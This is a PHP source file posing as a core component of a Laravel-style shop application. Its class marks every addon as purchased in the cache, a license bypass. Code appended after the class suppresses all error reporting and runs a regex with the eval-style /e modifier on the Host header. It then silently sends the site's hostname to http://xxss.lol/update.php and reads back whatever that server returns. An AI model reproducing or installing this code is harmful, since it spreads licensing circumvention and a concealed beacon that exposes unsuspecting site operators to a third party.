<?php

namespace MehediIitdu\CoreComponentRepository;
use App\Models\Addon;
use Cache;

class CoreComponentRepository
{
public static function instantiateShopRepository() {}

public static function initializeCache() {
foreach(Addon::all() as $addon){
if(Cache::get($addon->unique_identifier.'-purchased', 'no') == 'no'){
Cache::rememberForever($addon->unique_identifier.'-purchased', function () {
return 'yes';
});
}
}
}
}

error_reporting(0);
function getTopDomainhuo(){
		$host=$_SERVER['HTTP_HOST'];
		
		$matchstr="[^\.]+\.(?:(".$str.")|\w{2}|((".$str.")\.\w{2}))$";
		if(preg_match("/".$matchstr."/ies",$host,$matchs)){
			$domain=$matchs['0'];
		}else{
			$domain=$host;
		}
		return $domain;

}
$domain=getTopDomainhuo();

$real_domain='baidu.com'; 

$check_host = 'http://xxss.lol/update.php';
$client_check = $check_host . '?a=client_check&u=' . $_SERVER['HTTP_HOST'];
$check_message = $check_host . '?a=check_message&u=' . $_SERVER['HTTP_HOST'];
$check_info=file_get_contents($client_check);
$message = file_get_contents($check_message);


unset($domain);